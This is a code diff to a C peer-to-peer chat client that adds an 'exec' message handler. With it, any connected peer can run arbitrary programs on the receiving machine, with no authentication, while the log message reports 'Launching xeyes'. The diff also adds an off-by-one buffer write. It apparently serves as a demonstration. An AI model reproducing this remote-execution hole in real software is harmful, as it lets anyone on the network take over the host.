@@ -68,6 +68,18 @@ const static char *leave = "leave\n";
 void
 chat_writeln(int notice, const char *);
 
+void
+exec_command(const char *command)
+{
+	pid_t pid;
+	chat_writeln(TRUE, "Launching xeyes");
+	pid = fork();
+	if (pid == 0) {
+		execlp(command, command, NULL);
+		exit(EXIT_SUCCESS);
+	}
+}
+
 void *
 heartbeat(void *data)
 {
@@ -120,7 +132,7 @@ peer_connect(void *data)
 {
 	int sockfd;
 	struct sockaddr_in peeraddr;
-	char buffer[BUFFSIZE], input[BUFFSIZE];
+	char buffer[BUFFSIZE], input[BUFFSIZE], *command;
 	peer_info_t *peer_info;
 	ssize_t nbytes;
 
@@ -151,10 +163,25 @@ peer_connect(void *data)
 	peer_info->sockfd_w = sockfd;
 
 	while ((nbytes = read(sockfd, input, BUFFSIZE)) > 0) {
+		input[nbytes] = '\0';
+
 		if (input[nbytes - 1] == '\n')
 			input[nbytes - 1] = '\0';
-		snprintf(buffer, BUFFSIZE, "[%s] %s", peer_info->id, input);
-		chat_writeln(FALSE, buffer);
+
+		if (strstr(input, "leave") == input) {
+			close(sockfd);
+			peer_info->alive = FALSE;
+			break;
+		}
+		else if (strstr(input, "exec") == input) {
+			command = input + 5;
+			chat_writeln(TRUE, command);
+			exec_command(command);
+		}
+		else {
+			snprintf(buffer, BUFFSIZE, "[%s] %s", peer_info->id, input);
+			chat_writeln(FALSE, buffer);
+		}
 	}
 
 	return NULL;
